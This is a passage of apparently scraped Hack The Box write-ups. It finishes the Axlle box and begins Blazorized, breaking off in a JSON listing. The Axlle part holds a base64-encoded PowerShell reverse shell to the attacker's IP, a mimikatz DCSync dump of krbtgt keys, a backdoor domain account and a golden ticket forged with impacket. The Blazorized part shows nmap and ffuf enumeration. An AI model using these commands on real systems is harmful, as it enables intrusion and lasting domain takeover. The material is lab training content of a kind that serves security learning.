JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAzACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== &gt; \"C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\command.txt\"\n</code></pre> <p>We chose a <code>base64</code> encoded PowerShell command once again to establish the reverse shell connection, since it appears we have to stick to native Windows commands for this.</p> <p>We upload it to the victim host using <code>Evil-WinRM</code> upload functionality and subsequently run it to create the directories and files. We also confirm this as having been successful.</p> <pre><code>*Evil-WinRM* PS C:\\Programdata\\xpltive&gt; upload privesc.bat\n&lt;--SNIP--&gt;          \nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Programdata\\xpltive&gt; .\\privesc.bat\n&lt;--SNIP--&gt;\n*Evil-WinRM* PS C:\\Programdata\\xpltive&gt; tree /a /f \"C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\"      \nFolder PATH listing\nVolume serial number is 000001B4 BFF7:F940\nC:\\PROGRAM FILES (X86)\\WINDOWS KITS\\10\\TESTING\\STANDALONETESTING\\INTERNAL\\X64\n|   command.txt\n|   reboot.rsf\n|   standalonerunner.exe\n|   standalonexml.dll\n|\n\\---myTestDir\n    \\---working\n            rsf.rsf\n</code></pre> <p>We are now ready to escalate our privileges by simply waiting for the <code>standalonerunner.exe</code> to start on its own (since it was configured this way according to the <code>README.md</code> note).</p> <p>We obviously have our listener running first and will eventually catch the incoming reverse shell connection attempt.</p> <pre><code>$ rlwrap -cAr nc -lvnp 6666\nlistening on [any] 6666 ...\nconnect to [10.10.16.33] from (UNKNOWN) [10.129.65.77] 57192\n\nPS C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\myTestDir\\working&gt; whoami\naxlle\\administrator\nPS C:\\Program Files (x86)\\Windows Kits\\10\\Testing\\StandaloneTesting\\Internal\\x64\\myTestDir\\working&gt; hostname\nMAINFRAME\n</code></pre> <p>This concludes the successful compromise of the <code>MAINFRAME</code> host as well as the <code>axlle.htb</code> Active Directory domain. </p> <p>The root flag can be found at <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p> <pre><code>PS C:\\&gt; type \"C:\\Users\\Administrator\\Desktop\\root.txt\"\ncb3de3ae4e8dce9cf692c97b3ca841a4\n</code></pre>"}, {"location": "Write-Ups/Axlle/#persistence", "title": "Persistence", "text": "<p>For fun we will create a golden ticket for persistence. We start by transferring <code>Mimikatz</code> over to the victim and run the following to get the <code>KRBTGT</code> AES key.</p> <pre><code>PS C:\\Programdata\\xpltive&gt; .\\mimikatz.exe privilege::debug \"lsadump::dcsync /user:axlle\\krbtgt /domain:axlle.htb\" exit                                                                                                                                                                  \n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(commandline) # privilege::debug\nPrivilege '20' OK\n\nmimikatz(commandline) # lsadump::dcsync /user:axlle\\krbtgt /domain:axlle.htb\n[DC] 'axlle.htb' will be the domain\n[DC] 'MAINFRAME.axlle.htb' will be the DC server\n[DC] 'axlle\\krbtgt' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   : \nPassword last change : 1/1/2024 3:18:56 AM\nObject Security ID   : S-1-5-21-1005535646-190407494-3473065389-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: 6d92f4784b46504cf3bedbc702ac03fe\n    ntlm- 0: 6d92f4784b46504cf3bedbc702ac03fe\n    lm  - 0: 51e7af3b2adfa8ab0e4d04f0a6ddb059\n\nSupplemental Credentials:                                     \n* Primary:NTLM-Strong-NTOWF *                                 \n    Random Value : 771d8d8376a11efa67b494c7d5f27ff3\n\n* Primary:Kerberos-Newer-Keys * \n    Default Salt : AXLLE.HTBkrbtgt                               \n    Default Iterations : 4096                                         \n    Credentials                                                       \n      aes256_hmac       (4096) : ae2eb9caff08a7d80b1b9166f71a4de91e1bec20705400433383adf27f8d2a69\n      aes128_hmac       (4096) : 096a951763767ceca7e1e5a5628451bd\n      des_cbc_md5       (4096) : 9e545e64542a7070\n&lt;--SNIP--&gt;\n</code></pre> <p>Next we create our user using <code>net</code> and then get their SID using <code>PowerView</code>. We only need the relative object id part here. We also get the domain SID.</p> <pre><code>PS C:\\Programdata\\xpltive&gt; net user xpltive \"P@ssword123\" /add /domain\nPS C:\\Programdata\\xpltive&gt; Get-DomainUser -Identity xpltive\n\npwdlastset            : 1/17/2025 12:48:40 PM\nusncreated            : 172399                                        \nlastlogoff            : 12/31/1600 4:00:00 PM\nbadpwdcount           : 0                                             \nname                  : xpltive                                       \nsamaccounttype        : USER_OBJECT     \nsamaccountname        : xpltive                                       \nwhenchanged           : 1/17/2025 8:48:40 PM\nobjectsid             : S-1-5-21-1005535646-190407494-3473065389-10601\nPS C:\\Programdata\\xpltive&gt; Get-DomainSID\nS-1-5-21-1005535646-190407494-3473065389\n</code></pre> <p>This is everything we need and on our attack host we use the <code>ticketer</code> tool of <code>Impacket</code> to create our golden ticket. It will by default add our desired user to the <code>Domain Admins</code>, <code>Domain Users</code>, <code>Schema Admins</code>, <code>Enterprise Admins</code> and <code>Group Policy Creator Owners</code> groups.</p> <pre><code>$ impacket-ticketer -aesKey ae2eb9caff08a7d80b1b9166f71a4de91e1bec20705400433383adf27f8d2a69 -domain axlle.htb -domain-sid S-1-5-21-1005535646-190407494-3473065389 -user-id 10601 xpltive                                                                   \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for axlle.htb/xpltive\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncAsRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncASRepPart\n[*] Saving ticket in xpltive.ccache\n</code></pre> <p>And we can validate our little backdoor account with <code>Netexec</code>.</p> <pre><code>$ KRB5CCNAME=xpltive.ccache nxc smb mainframe.axlle.htb -u xpltive -k --use-kcache -x \"whoami /all\" \nSMB         mainframe.axlle.htb 445    MAINFRAME        [*] Windows Server 2022 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)\nSMB         mainframe.axlle.htb 445    MAINFRAME        [+] axlle.htb\\xpltive from ccache (Pwn3d!)\nSMB         mainframe.axlle.htb 445    MAINFRAME        [+] Executed command via wmiexec\nSMB         mainframe.axlle.htb 445    MAINFRAME        USER INFORMATION\nSMB         mainframe.axlle.htb 445    MAINFRAME        ----------------\nSMB         mainframe.axlle.htb 445    MAINFRAME        User Name         SID\nSMB         mainframe.axlle.htb 445    MAINFRAME        ================= ==============================================\nSMB         mainframe.axlle.htb 445    MAINFRAME        axlle.htb\\xpltive S-1-5-21-1005535646-190407494-3473065389-10601\nSMB         mainframe.axlle.htb 445    MAINFRAME        GROUP INFORMATION\nSMB         mainframe.axlle.htb 445    MAINFRAME        -----------------\nSMB         mainframe.axlle.htb 445    MAINFRAME        Group Name                                   Type             SID                                          Attributes\nSMB         mainframe.axlle.htb 445    MAINFRAME        ============================================ ================ ============================================ ===============================================================\nSMB         mainframe.axlle.htb 445    MAINFRAME        Everyone                                     Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group\nSMB         mainframe.axlle.htb 445    MAINFRAME        BUILTIN\\Users                                Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group\nSMB         mainframe.axlle.htb 445    MAINFRAME        BUILTIN\\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group\nSMB         mainframe.axlle.htb 445    MAINFRAME        BUILTIN\\Administrators                       Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner\nSMB         mainframe.axlle.htb 445    MAINFRAME        NT AUTHORITY\\NETWORK                         Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group\nSMB         mainframe.axlle.htb 445    MAINFRAME        NT AUTHORITY\\Authenticated Users             Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group\nSMB         mainframe.axlle.htb 445    MAINFRAME        NT AUTHORITY\\This Organization               Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group\nSMB         mainframe.axlle.htb 445    MAINFRAME        AXLLE\\Domain Admins                          Group            S-1-5-21-1005535646-190407494-3473065389-512 Mandatory group, Enabled by default, Enabled group\nSMB         mainframe.axlle.htb 445    MAINFRAME        AXLLE\\Group Policy Creator Owners            Group            S-1-5-21-1005535646-190407494-3473065389-520 Mandatory group, Enabled by default, Enabled group\nSMB         mainframe.axlle.htb 445    MAINFRAME        AXLLE\\Schema Admins                          Group            S-1-5-21-1005535646-190407494-3473065389-518 Mandatory group, Enabled by default, Enabled group\nSMB         mainframe.axlle.htb 445    MAINFRAME        AXLLE\\Enterprise Admins                      Group            S-1-5-21-1005535646-190407494-3473065389-519 Mandatory group, Enabled by default, Enabled group\nSMB         mainframe.axlle.htb 445    MAINFRAME        AXLLE\\Denied RODC Password Replication Group Alias            S-1-5-21-1005535646-190407494-3473065389-572 Mandatory group, Enabled by default, Enabled group, Local Group\nSMB         mainframe.axlle.htb 445    MAINFRAME        Mandatory Label\\High Mandatory Level         Label            S-1-16-12288\nSMB         mainframe.axlle.htb 445    MAINFRAME        PRIVILEGES INFORMATION\nSMB         mainframe.axlle.htb 445    MAINFRAME        ----------------------\nSMB         mainframe.axlle.htb 445    MAINFRAME        Privilege Name                            Description                                                        State\nSMB         mainframe.axlle.htb 445    MAINFRAME        ========================================= ================================================================== =======\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeSecurityPrivilege                       Manage auditing and security log                                   Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeSystemProfilePrivilege                  Profile system performance                                         Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeSystemtimePrivilege                     Change the system time                                             Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeProfileSingleProcessPrivilege           Profile single process                                             Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeBackupPrivilege                         Back up files and directories                                      Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeRestorePrivilege                        Restore files and directories                                      Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeShutdownPrivilege                       Shut down the system                                               Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeDebugPrivilege                          Debug programs                                                     Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeUndockPrivilege                         Remove computer from docking station                               Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeCreateGlobalPrivilege                   Create global objects                                              Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeTimeZonePrivilege                       Change the time zone                                               Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled\nSMB         mainframe.axlle.htb 445    MAINFRAME        USER CLAIMS INFORMATION\nSMB         mainframe.axlle.htb 445    MAINFRAME        -----------------------\nSMB         mainframe.axlle.htb 445    MAINFRAME        User claims unknown.\nSMB         mainframe.axlle.htb 445    MAINFRAME        Kerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre>"}, {"location": "Write-Ups/Blazorized/", "title": "Blazorized", "text": ""}, {"location": "Write-Ups/Blazorized/#initial-enumeration", "title": "Initial Enumeration", "text": ""}, {"location": "Write-Ups/Blazorized/#nmap-scan", "title": "Nmap Scan", "text": "<p>We start off with <code>Nmap</code> and a scan with the <code>-p-</code> and <code>--min-rate 1000</code> flags to get an overview of the open ports. Once we have a list we run a deeper scan on the discovered open ports to get the services/versions and run some default scripts.</p> <pre><code>$ sudo nmap -p- --min-rate 10000 10.129.231.74 -oN scans/all-ports-tcp.nmap                                               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 22:17 CET\nNmap scan report for 10.129.231.74\nHost is up (0.031s latency).\nNot shown: 65507 closed tcp ports (reset)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n1433/tcp  open  ms-sql-s\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49673/tcp open  unknown\n49678/tcp open  unknown\n49679/tcp open  unknown\n49684/tcp open  unknown\n49691/tcp open  unknown\n49698/tcp open  unknown\n49722/tcp open  unknown\n49776/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 10.14 seconds\n\n$ sudo nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001 -sC -sV 10.129.231.74 -oN scans/tcp-detailed.nmap\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 22:18 CET\nNmap scan report for 10.129.231.74\nHost is up (0.043s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Did not follow redirect to http://blazorized.htb\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-17 21:18:29Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+\n| ms-sql-info: \n|   10.129.231.74\\BLAZORIZED: \n|     Instance name: BLAZORIZED\n|     Version: \n|       name: Microsoft SQL Server 2022 RC0+\n|       number: 16.00.1115.00\n|       Product: Microsoft SQL Server 2022\n|       Service pack level: RC0\n|       Post-SP patches applied: true\n|     TCP port: 1433\n|_    Clustered: false\n| ms-sql-ntlm-info: \n|   10.129.231.74\\BLAZORIZED: \n|     Target_Name: BLAZORIZED\n|     NetBIOS_Domain_Name: BLAZORIZED\n|     NetBIOS_Computer_Name: DC1\n|     DNS_Domain_Name: blazorized.htb\n|     DNS_Computer_Name: DC1.blazorized.htb\n|     DNS_Tree_Name: blazorized.htb\n|_    Product_Version: 10.0.17763\n|_ssl-date: 2025-01-17T21:18:43+00:00; +1s from scanner time.\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2025-01-17T21:15:45\n|_Not valid after:  2055-01-17T21:15:45\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-01-17T21:18:38\n|_  start_date: N/A\n|_clock-skew: mean: 1s, deviation: 0s, median: 0s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 23.80 seconds\n</code></pre> <ul> <li>Active Directory Domain Controller (LDAP)</li> <li>Domain name: <code>blazorized.htb</code></li> <li>Host name: <code>DC1</code></li> <li>HTTP 80/TCP (redirect to <code>http://blazorized.htb</code>)</li> <li>MSSQL Server 1433/TCP</li> </ul> <p>We add everything to our <code>/etc/hosts</code> file and move on to enumerating the website on 80/TCP.</p>"}, {"location": "Write-Ups/Blazorized/#port-80tcp", "title": "Port 80/TCP", "text": "<p>During manual enumeration we find the website being a static website and using <code>Blazor WebAssembly</code>.</p> <p></p> <p>We continue by fuzzing for virtual hosts using <code>FFuF</code> and discover the <code>admin.blazorized.htb</code> virtual host.</p> <pre><code>$ ffuf -u http://blazorized.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -H \"Host: FUZZ.blazorized.htb\" -fs 144\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://blazorized.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt\n :: Header           : Host: FUZZ.blazorized.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 144\n________________________________________________\n\nadmin                   [Status: 200, Size: 2047, Words: 149, Lines: 28, Duration: 39ms]\n:: Progress: [151265/151265] :: Job [1/1] :: 1129 req/sec :: Duration: [0:01:47] :: Errors: 0 ::\n</code></pre> <p>Adding it to our <code>/etc/hosts</code> file and navigating to it we get access to the Super Admin login form.</p> <p></p> <p>We can try some weak credentials, but to no avail. We will continue researching and enumerating about <code>Blazor</code> itself.</p>"}, {"location": "Write-Ups/Blazorized/#researching-enumerating-sensitive-files-in-blazor", "title": "Researching &amp; Enumerating Sensitive Files in Blazor", "text": "<p>After doing some research about <code>Blazor</code> using the Microsoft Docs, we eventually come across the <code>blazor.boot.json</code> resource file, which contains a manifest of the files that make up the web application itself (see here). We also know through research on the documentation, that the static web assets are stored inside the <code>_framework</code> folder. Conveniently the <code>blazor.boot.json</code> is stored there as well and we <code>curl</code> it to the contents of it. This reveals the full list of <code>.dll</code> files used by the web application.</p> <pre><code>$ curl -s 'http://blazorized.htb/_framework/blazor.boot.json'\n{\n  \"cacheBootResources\": true,\n  \"config\": [ ],\n  \"debugBuild\": false,\n  \"entryAssembly\": \"Blazorized.DigitalGarden\",\n  \"icuDataMode\": 0,\n  \"linkerEnabled\": true,\n  \"resources\": {\n    \"assembly\": {\n      \"Blazored.LocalStorage.dll\": \"sha256-5V8ovY1srbIIz7lzzMhLd3nNJ9LJ6bHoBOnLJahv8Go=\",\n      \"Blazorized.DigitalGarden.dll\": \"sha256-YH2BGBuuUllYRVTLRSM+TxZtmhmNitErmBqq1Xb1fdI=\",\n      \"Blazorized.Shared.dll\": \"sha256-Bz\\/iaIKjbUZ4pzYB1LxrExKonhSlVdPH63LsehtJDqY=\",\n      \"Markdig.dll\": \"sha256-\\/zBLNTAFSwzmj9Qq3hOzX4jN+IzlZOPHCL3qEU4t8BQ=\",\n      \"Microsoft.AspNetCore.Components.dll\": \"sha256-q\\/vMB0OEwpfgaAe0kahnXQUPQ5ux0ryaY2BXkF22E8Y=\",\n      \"Microsoft.AspNetCore.Components.Forms.dll\": \"sha256-ilsozHMhNmrU5XRQkeYzpGDYHyLUQXPUW4Hh4D7ueZ4=\",\n      \"Microsoft.AspNetCore.Components.Web.dll\": \"sha256-KWEr4EaQSjbTnpfqEN\\/6Nl330iwzKzUAkJlJ1BpK\\/MU=\",\n      \"Microsoft.AspNetCore.Components.WebAssembly.dll\": \"sha256-Ej9bH2qZK\\/yyvACie45LB5PgSAlH0sPfZjnHKyBY1MA=\",\n      \"Microsoft.Extensions.Configuration.Abstractions.dll\": \"sha256-X\\/f4fDl2cuIRXeWHhK\\/f2UqQbFioD+RU4a4CEh0zrrQ=\",\n      \"Microsoft.Extensions.Configuration.dll\": \"sha256-DBOKSPriP2JDxVbbWrLXyD3K4\\/x3RBifNBWk\\/q1I39M=\",\n      \"Microsoft.Extensions.Configuration.Json.dll\": \"sha256-Q5AqJneA2TZnzC0IYzBx6j\\/tHRhWAeMbpH3BsV7KgWg=\",\n      \"Microsoft.Extensions.DependencyInjection.Abstractions.dll\": \"sha256-3dT6SSIGGrs8Me0BhM7OKQNnZgPiMpzxJxbKZg9+PPk=\",\n      \"Microsoft.Extensions.DependencyInjection.dll\": \"sha256-qi0kE7rp0kdsNqdL6DyPZEeimjUGvcLT4iWQX0YnRus=\",\n      \"Microsoft.Extensions.Http.dll\": \"sha256-rZWnWVD6nK+nRjxDQYWLF5GE9vGvT14HtIoM\\/0PlVd0=\",\n      \"Microsoft.Extensions.Localization.Abstractions.dll\": \"sha256-HmuAsUnHX2mxnAL703FjrEbwGneVw5Q96ZGBg3m7xEw=\",\n      \"Microsoft.Extensions.Localization.dll\": \"sha256-oL+8vEgiohIU\\/VOsIukfsaS53JGMyOPV5Grr6Zd6TSk=\",\n      \"Microsoft.Extensions.Logging.Abstractions.dll\": \"sha256-+5dUbJ9ffsgK5RahPCQeMw5x76+LlE6F9dqvF2FoBHg=\",\n      \"Microsoft.Extensions.Logging.dll\": \"sha256-Sezvu1SpB+vPfYWMQ+LQtRpFvN9Ym3AvPDnKYCKxL14=\",\n      \"Microsoft.Extensions.Options.dll\": \"sha256-k9XISCK5fk9IUDDKqLl\\/+QFebprK5dgTjSKpE\\/Zpz8Q=\",\n      \"Microsoft.Extensions.Primitives.dll\": \"sha256-eXvGx2jcjpTPEJoAHBsW\\/VuMPbNyyU+AsuhPmkzSSRY=\",\n      \"Microsoft.IdentityModel.Abstractions.dll\": \"sha256-a1daKYknMuF16uFadrwL8fjYxiN83JCr285kxf6l1SI=\",\n      \"Microsoft.IdentityModel.JsonWebTokens.dll\": \"sha256-ZceT+VyXrVMCCQx7ghNz4BXbpCkOZwHTSkPikk1tYfg=\",\n      \"Microsoft.IdentityModel.Logging.dll\": \"sha256-yUKJ+ALshaP1bgyC3HBJYhvWi8ZO89OQq1D6xzUcsjA=\",\n      \"Microsoft.IdentityModel.Tokens.dll\": \"sha256-kci9vmm4cxzxjfLH7gBsdkuSD95idJws2K27ijmaMqg=\",\n      \"Microsoft.JSInterop.dll\": \"sha256-3OzHtLOp\\/ABrxbs+cwoO9uxU3d1YqRrcP6MgKAWKCOQ=\",\n      \"Microsoft.JSInterop.WebAssembly.dll\": \"sha256-4cMfifCYL\\/bv5qiC8T6HyABhOewZlTXovRc+E\\/CrUbc=\",\n      \"MudBlazor.dll\": \"sha256-BCkPqJ+DM7hJKpuUnFQY98YKaIwoRWyqzw8JkUBKQf0=\",\n      \"MudBlazor.Markdown.dll\": \"sha256-6eL9fPi7IlrwF4XROmZgloTtnqKEqzak7Aew1tykYPI=\",\n      \"System.Collections.Concurrent.dll\": \"sha256-VJZ+9mtVjI3oFnHaOcs7QQWwE1tpcmsn\\/Fbf1ss51EE=\",\n      \"System.Collections.dll\": \"sha256-PcqW0HOMhSsdhOuo97PP73z311WvAUQjMNlDxO0YNvg=\",\n      \"System.ComponentModel.Annotations.dll\": \"sha256-p3FeLGazqadK+YWA5aMJEwKQP4\\/CX0gumrfPLmaMmss=\",\n      \"System.ComponentModel.dll\": \"sha256-Fk2YdbIh1S9I3Jn+elQpV9RdU2OqJiVenl74EbfuW34=\",\n      \"System.ComponentModel.Primitives.dll\": \"sha256-f2JppNaTVR3r2YAWy4aA5vx0Ouy5xoW17tkOh8su2Wc=\",\n      \"System.ComponentModel.TypeConverter.dll\": \"sha256-z8NaAg44tOD7RGtFlQNGs6GywkgWXfQxiH9IJyUJaBs=\",\n      \"System.Console.dll\": \"sha256-Z0qITFiDb6P2gyaZV9Ku42+3y\\/8YwgfrxLnEDp5E15s=\",\n      \"System.dll\": \"sha256-GXYaTkUWqIcsGI6VKD2SIHDrRwOD2xQU1UA9nONh8PU=\",\n      \"System.Formats.Asn1.dll\": \"sha256-V5AtfHy4i4TRClZ4wQZ7hPz5VgLdBCZQYasU5aJR9D0=\",\n      \"System.IdentityModel.Tokens.Jwt.dll\": \"sha256-6UnGv5ruxREG0Pk32MuWFOFjcqcvYNuinJcJaBXPnRA=\",\n      \"System.IO.Compression.dll\": \"sha256-6oQKWB3LN6lvKLNpYiIalauJCy2YonpZ7QBLAmoMCao=\",\n      \"System.Linq.dll\": \"sha256-YuUMLuHQ4VWrIe8ecXrKp6f8BFkPKwTInHAFtRspY3A=\",\n      \"System.Linq.Expressions.dll\": 